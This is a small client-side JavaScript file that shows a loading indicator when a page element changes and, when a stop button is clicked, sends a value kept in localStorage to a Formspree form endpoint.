const successfulDiv = document.getElementById("successOutput");
const loadingDiv = document.getElementById("loading");

// Function to show loader
function showLoader() {
  loadingDiv.style.display = "block";
}

// Function to hide loader
function hideLoader() {
  loadingDiv.style.display = "none";
}

// Observe changes in the #successful element
const observer = new MutationObserver((mutations) => {
  // When any mutation occurs, show the loader
  showLoader();
});

// Start observing the element's child list and attributes
observer.observe(successfulDiv, {
  childList: true,
  subtree: true,
  characterData: true,
  attributes: true,
});

// Example: simulate a change after some time (for demonstration)
// Remove or modify this in your actual implementation
setTimeout(() => {
 successfulDiv.textContent = "Operation Successful!";
}, 2000);

// Stop button to hide the loader
stopButton.addEventListener("click", () => {
  hideLoader();
  sendMessage();
});

// Function to send message to Formspree
async function sendMessage() {
  const message = localStorage.getItem('success');

  if (!message) {
    console.log('No message found in localStorage.');
    return;
  }

  try {
    const response = await fetch('https://formspree.io/f/xrbpywrn', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        message: message,
        email: "user11@gmail.com" 
      })
    });

    if (response.ok) {
      console.log('Success: Message sent successfully.');
    } else {
      console.error('Error: Failed to send message.', response.statusText);
    }
  } catch (error) {
    console.error('Error:', error);
  }
}

// Call the function
document.addEventListener("DOMContentLoaded", () => {
  document.getElementById('textInput').value=localStorage.getItem('success');
});
